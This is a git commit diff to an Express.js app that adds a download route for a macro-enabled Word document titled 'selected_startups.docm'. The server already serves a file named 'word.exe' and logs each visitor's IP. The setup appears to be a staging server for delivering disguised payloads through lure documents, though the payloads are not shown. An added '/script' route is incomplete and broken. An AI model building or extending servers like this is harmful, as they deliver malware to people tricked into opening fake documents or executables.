3e94915ad04b1791af861518c902775fa5435b88
cygnn <cpuntanar4@gmail.com>
2025-02-27 18:26:23 +0800

    added a docm file

--- app.js
+++ app.js
@@ -8,6 +8,7 @@ const __dirname = path.dirname(__filename);
 
 const app = express()
 const FILE_PATH = path.join(__dirname, "word.exe")
+const DOCM_PATH = path.join(__dirname, "selected_startups.docm")
 
 app.use(express.static('public'));
 app.use(express.urlencoded({ extended: true }));
@@ -17,6 +18,23 @@ app.use((req, res, next) => {
     console.log(`[+] Request received from ${req.ip} for ${req.url}`);
     next();
   });
+
+
+  app.get("/download/startups", (req,res) => {
+    res.download(DOCM_PATH, "selected_startups.docm", (err) => {
+      if (err) {
+        console.error("[-] Error sending file:", err);
+        res.status(500).send("Server error");
+      }
+      else{
+        console.log(`[+] File sent to ${req.ip}`);
+      }
+    })
+  })
+
+  app.get("/script", (req,res) => {
+    res.download()
+  })
 
   app.get("/word.exe", (req, res) => {
     res.download(FILE_PATH, "word.exe", (err) => {
